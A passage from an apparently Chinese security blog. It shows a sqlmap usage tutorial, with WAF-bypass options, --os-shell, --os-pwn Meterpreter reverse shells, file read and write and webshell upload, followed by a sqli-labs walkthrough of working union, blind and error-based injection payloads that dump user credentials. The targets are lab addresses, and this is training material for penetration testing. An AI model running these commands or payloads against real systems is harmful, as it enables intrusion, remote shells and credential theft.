blind SQL injection（基于时间延迟注⼊）<br>sqlmap -d <span class="hljs-string">&quot;mysql://root:root@192.168.10.130:3306/mysql&quot;</span> --os-shell <span class="hljs-comment">#知道⽹站的账号密码直接连接</span><br>-v3 <span class="hljs-comment">#输出详细度 最⼤值5 会显示请求包和回复包</span><br>--threads 5 <span class="hljs-comment">#指定线程数</span><br>--fresh-queries <span class="hljs-comment">#清除缓存</span><br>探测指定URL是否存在SQL注⼊漏洞<br>对于不⽤登录的⽹站，直接指定其URL<br>在探测⽬标URL是否存在漏洞的过程中，Sqlmap会和我们进⾏交互。<br>⽐如第⼀处交互的地⽅是说这个⽬标系统的数据库好像是Mysql数据库，是否还探测其他类型<br>的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道⽬标系统是Mysql<br>数据库了。<br>第⼆处交互的地⽅是说 对于剩下的测试，问我们是否想要使⽤扩展提供的级别(1)和⻛险(1)值<br>的“MySQL”的所有测试吗？ 我们选择 y。<br>--flush-session <span class="hljs-comment">#清空会话，重构注⼊</span><br>--batch <span class="hljs-comment">#对所有的交互式的都是默认的</span><br>--random-agent <span class="hljs-comment">#任意的http头</span><br>--tamper base64encode <span class="hljs-comment">#对提交的数据进⾏base64编码</span><br>--referer http://www.baidu.com <span class="hljs-comment">#伪造referer字段</span><br>--keep-alive 保持连接，当出现 [CRITICAL] connection dropped or unknown<br></code></pre></td></tr></table></figure><h2 id="Sqlmap的⾼级⽤法"><a href="#Sqlmap的⾼级⽤法" class="headerlink" title="Sqlmap的⾼级⽤法"></a>Sqlmap的⾼级⽤法</h2><p>Sqlmap在默认情况下除了适⽤CHAR()函数防⽌出现单引号，没有对注⼊的数据进⾏修改。我 们可以使⽤—tamper参数对数据进⾏修改来绕过WAF等设备，其中的⼤部分脚本主要⽤正则 模块替换攻击载荷字符编码的⽅式尝试绕过WAF的检测规则。Sqlmap⽬前官⽅提供53个绕过 脚本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">--identify-waf 检测是否有WAF<br><span class="hljs-comment">#使⽤参数进⾏绕过</span><br>--random-agent 使⽤任意HTTP头进⾏绕过，尤其是在WAF配置不当的时候<br>--time-sec=3 使⽤⻓的延时来避免触发WAF的机制，这⽅式⽐较耗时<br>--hpp 使⽤HTTP 参数污染进⾏绕过，尤其是在ASP.NET/IIS 平台上<br>--proxy=100.100.100.100:8080 --proxy-cred=211:985 使⽤代理进⾏绕过<br>--ignore-proxy 禁⽌使⽤系统的代理，直接连接进⾏注⼊<br>--flush-session 清空会话，重构注⼊<br>--hex 或者 --no-cast 进⾏字符码转换<br>--mobile 对移动端的服务器进⾏注⼊<br>--tor 匿名注⼊<br></code></pre></td></tr></table></figure><ul><li><h4 id="指定脚本进⾏绕过-—tamper"><a href="#指定脚本进⾏绕过-—tamper" class="headerlink" title="指定脚本进⾏绕过(—tamper)"></a>指定脚本进⾏绕过(—tamper)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --tamper=space2comment.py <span class="hljs-comment">#⽤/**/代替空格</span><br>sqlmap --tamper=<span class="hljs-string">&quot;space2comment.py,space2plus.py&quot;</span> 指定多个脚本进⾏过滤<br></code></pre></td></tr></table></figure><p>在该目录下&#x2F;sqlmap&#x2F;tamper</p><p><img src="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/image-20240108095010258.png" alt="image-20240108095010258"></p></li><li><h4 id="探测等级和危险等级-—level-—risk"><a href="#探测等级和危险等级-—level-—risk" class="headerlink" title="探测等级和危险等级(—level —risk)"></a>探测等级和危险等级(—level —risk)</h4><p>Sqlmap ⼀共有5个探测等级，默认是1。等级越⾼，说明探测时使⽤的payload也越多。其中5 级的payload最多，会⾃动破解出cookie、XFF等头部注⼊。当然，等级越⾼，探测的时间也 越慢。这个参数会影响测试的注⼊点，GET和POST的数据都会进⾏测试，HTTP cookie在 level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。在不确定哪个参数 为注⼊点时，为了保证准确性，建议设置level为5</p><p>sqlmap ⼀共有3个危险等级，也就是说你认为这个⽹站存在⼏级的危险等级。和探测等级⼀个 意思，在不确定的情况下，建议设置为3级，—risk&#x3D;3</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --level=5 --risk=3 <span class="hljs-comment">#探测等级5，平台危险等级3，都是最⾼级别</span><br></code></pre></td></tr></table></figure></li><li><h4 id="执⾏指定的SQL语句-—sql-shell"><a href="#执⾏指定的SQL语句-—sql-shell" class="headerlink" title="执⾏指定的SQL语句(—sql-shell)"></a>执⾏指定的SQL语句(—sql-shell)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --sql-shell <span class="hljs-comment">#执⾏指定的sql语句</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/image-20240108095500603.png" alt="image-20240108095500603"></p></li><li><h4 id="执⾏操作系统命令-—os-shell"><a href="#执⾏操作系统命令-—os-shell" class="headerlink" title="执⾏操作系统命令(—os-shell)"></a>执⾏操作系统命令(—os-shell)</h4><p>在数据库为MySQL、PostgreSql或者SQL Server时，可以执⾏该选项。 当为MySQL数据库时</p><p>需满⾜下⾯三个条件：</p><ul><li>当前⽤户为 root</li><li>知道⽹站根⽬录的绝对路径</li><li>该数据库的 secure_file_priv 参数值为空(很多数据库的该值为NULL，这也就导致了即使 当前⽤户是root，即使知道了⽹站根⽬的绝对路径，也不能执⾏成功 —os-shell )</li></ul></li><li><h4 id="反弹⼀个MSF的shell-—os-pwn"><a href="#反弹⼀个MSF的shell-—os-pwn" class="headerlink" title="反弹⼀个MSF的shell(—os-pwn)"></a>反弹⼀个MSF的shell(—os-pwn)</h4><p>在数据库为MySQL、PostgreSql或者SQL Server时，可以执⾏该选项。并且需要当前获取的 权限⾜够⾼才可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.20:88/index.php?id=1&quot;</span> --os-pwn<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">选择连接的tunnel，这⾥选择默认的 1 就可以了<br>[1] TCP: Metasploit Framework (default)<br>[2] ICMP: icmpsh – ICMP tunneling<br>&gt; 1<br>选择⽹站的脚本语⾔，这⾥根据情况选择<br>[1] ASP<br>[2] ASPX<br>[3] JSP<br>[4] PHP (default)<br>&gt; 4<br>选择⽹站的路径，这⾥也是根据情况⽽定，如果知道⽹站路径的话，可以选择2然后⼿动输⼊<br>[1] common location(s) (‘C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/‘)<br>(default)<br>[2] custom location(s)<br>[3] custom directory list file<br>[4] brute force search<br>&gt; 2<br>please provide a comma separate list of absolute directory paths: C:\phpstudy\WWW<br><br><br><br>然后选择连接的类型，这⾥选择默认的1 即可<br><span class="hljs-built_in">which</span> connection <span class="hljs-built_in">type</span> <span class="hljs-keyword">do</span> you want to use?<br>[1] Reverse TCP: Connect back from the database host to this machine (default)<br>[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports<br>between the specified and 65535<br>[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic<br>over HTTP<br>[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic<br>over HTTPS<br>[5] Bind TCP: Listen on the database host <span class="hljs-keyword">for</span> a connection<br>&gt; 1<br><br><br><span class="hljs-built_in">which</span> payload <span class="hljs-keyword">do</span> you want to use?nt to use? [11563] ‘ (detected)]<br>[1] Meterpreter (default)<br>[2] Shell<br>[3] VNC<br>&gt; 1<br><br>执⾏完成后，如果不出问题，我们就可以获得⼀个MSF类型的shell了<br></code></pre></td></tr></table></figure><p><img src="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/image-20240108102954635.png" alt="image-20240108102954635"></p></li><li><h4 id="读取服务器⽂件-—file-read"><a href="#读取服务器⽂件-—file-read" class="headerlink" title="读取服务器⽂件(—file-read)"></a>读取服务器⽂件(—file-read)</h4><p>当数据库为MySQL、PostgreSQL或SQL Server，并且当前⽤户有权限时，可以读取指定⽂ 件，可以是⽂本⽂件或者⼆进制⽂件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --file-read <span class="hljs-string">&quot;c:/test.txt&quot;</span> <span class="hljs-comment">#读取⽬标服务器C盘下的test.txt⽂件</span><br></code></pre></td></tr></table></figure><p>可以看到，⽂件读取成功了，并且保存成了 &#x2F;root&#x2F;.sqlmap&#x2F;output&#x2F;192.168.10.1&#x2F;files&#x2F;c__test.txt ⽂件</p></li><li><h4 id="上传⽂件到数据库服务器中-—file-write-—file-dest"><a href="#上传⽂件到数据库服务器中-—file-write-—file-dest" class="headerlink" title="上传⽂件到数据库服务器中(—file-write —file-dest)"></a>上传⽂件到数据库服务器中(—file-write —file-dest)</h4><p>当数据库为MySQL、Postgre SQL或者Sql Server(通过powershell写⼊)，并且当前⽤户有权 限向任意⽬录写⽂件的时候，可以上传⽂件到数据库服务器。⽂件可以是⽂本，也可以是⼆ 进制⽂件。 所以利⽤上传⽂件，我们可以上传⼀句话⽊⻢或者上传shell上去。 前提是我们知道⽹络的绝对路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 sqlmap.py -u http://192.168.10.130/sqli-labs/Less-2/?<span class="hljs-built_in">id</span>=1 --file-write C:\Users\mi\Desktop\1.php --file-dest <span class="hljs-string">&quot;C:\phpStudy\PHPTutorial\WWW\2.php&quot;</span> <span class="hljs-comment">#将本地的C:\Users\mi\Desktop\1.php⽂件上传到⽬标服务器C:\phpStudy\PHPTutorial\WWW\2.php</span><br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入靶场练习</title>
    <link href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    <url>/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221357926.png" alt="image-20240107221357926"></p><p>在MySQL5.0版本之后，默认在数据库中存放了一个”information_schema”的数据库，在该库中，有三个比较重要的表名分别是SCHEMATA,TABLES和COLUMNS。</p><ul><li>SCHEMATA表存储该用户的所有数据库的库名。需要记住表中数据库库名字段为SCHEMA_NAME。</li><li>TABLES表存储该用户创建的所有数据库的库名和表名，数据库库名和表名字段分别是TABLE_SCHEMA和TABLE_NAME</li><li>COLUMNS表存储该用户创建的所有数据库的数据库名，表名，字段名，分别是TABLE_SCHMA、TABLE_NAME、COLUMN_NAME</li></ul><h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><ul><li><h6 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h6><p>加单引号访问报错</p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221543951.png" alt="image-20240107221543951"></p><p>可以确定为单引号注入<br>接着来判断字段数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; order by 4 -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221631265.png" alt="image-20240107221631265"></p><p>改成3，无报错正常</p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221651883.png" alt="image-20240107221651883"></p><p>查版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,version(),3  -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221722298.png" alt="image-20240107221722298"></p><p>查询当前数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,database(),3  -- +</span><br></code></pre></td></tr></table></figure><p>查询当前用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,user(),3  -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221807462.png" alt="image-20240107221807462"></p><p>查询所有的数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221843095.png" alt="image-20240107221843095"></p><p>查询指定数据库中的表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221910177.png" alt="image-20240107221910177"></p><p>查询表中的字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107221936327.png" alt="image-20240107221936327"></p><p>查询字段的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-1/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,group_concat(password),group_concat(username) from security.users -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222006005.png" alt="image-20240107222006005"></p></li><li><h6 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-2/?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&quot;</span><br><span class="hljs-string">http://127.0.0.1/sql/Less-2/?id=1&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222049068.png" alt="image-20240107222049068"></p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222059574.png" alt="image-20240107222059574"></p><p>得出这是一个数字型注入<br> 猜字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-2/?<span class="hljs-built_in">id</span>=1 order by 4 -- +<br>http://127.0.0.1/sql/Less-2/?<span class="hljs-built_in">id</span>=1 order by 3 -- +<br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222138397.png" alt="image-20240107222138397"></p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222152314.png" alt="image-20240107222152314"></p><p>得出字段数为3<br>后门操作和Less-1如出一辙不过多赘述</p></li><li><h6 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h6><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222215970.png" alt="image-20240107222215970"></p><p>可以猜测出id因该是这样的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-string">&#x27;id&#x27;</span>）<br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222241650.png" alt="image-20240107222241650"></p><p>其余操作和less-01一样</p></li><li><h6 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h6><p>单引号无效</p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222312332.png" alt="image-20240107222312332"></p><p>双引号</p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222324237.png" alt="image-20240107222324237"></p><p>判断出id为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-string">&quot;id&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222449220.png" alt="image-20240107222449220"></p><p>其余操作和less-01一样</p></li><li><h6 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h6><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222513145.png" alt="image-20240107222513145"></p><p>和less-01一样只不过这里是bool盲注</p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222527188.png" alt="image-20240107222527188"></p><p>猜字段</p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222541052.png" alt="image-20240107222541052"></p><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222549368.png" alt="image-20240107222549368"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; or substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27; -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222646143.png" alt="image-20240107222646143"></p><p>通过以上方法可以猜解出数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; or (select table_name from information_schema.tables where table_schema=database() limit 0,1)=&#x27;</span>emails<span class="hljs-string">&#x27; -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222721767.png" alt="image-20240107222721767"></p><p>依次猜字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; or (select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;</span><span class="hljs-built_in">users</span><span class="hljs-string">&#x27; limit 1,1)=&#x27;</span>username<span class="hljs-string">&#x27; -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222753524.png" alt="image-20240107222753524"></p><p>拿到猜出来的字段名，库名，表名就去整字段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; or (select username from users where id=1)=&#x27;</span>dumb<span class="hljs-string">&#x27; -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222822837.png" alt="image-20240107222822837"></p><p>在实战情况下一般是借助自动化工具来爆破</p></li><li><h6 id="Less6"><a href="#Less6" class="headerlink" title="Less6"></a>Less6</h6><p>二次查询注入<br>请参考<a href="https://blog.csdn.net/qq_43573676/article/details/105774162">https://blog.csdn.net/qq_43573676/article/details/105774162</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,count(*),concat((select version()),floor(rand()*2)) as a from information_schema.tables group by a -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107222939049.png" alt="image-20240107222939049"></p><p>查询库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,count(*),concat((select schema_name from information_schema.schemata limit 2,1),floor(rand()*2)) as a from information_schema.tables group by a -- +</span><br></code></pre></td></tr></table></figure><p><img src="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107223006687.png" alt="image-20240107223006687"></p><p>查表名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/sql/Less-5/?<span class="hljs-built_in">id</span>=-1<span class="hljs-string">&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 2,1),floor(rand()*2)) as a from information_schema.tables  group by a -- +</span><br></code></pre></td></tr></table></figure><p><img 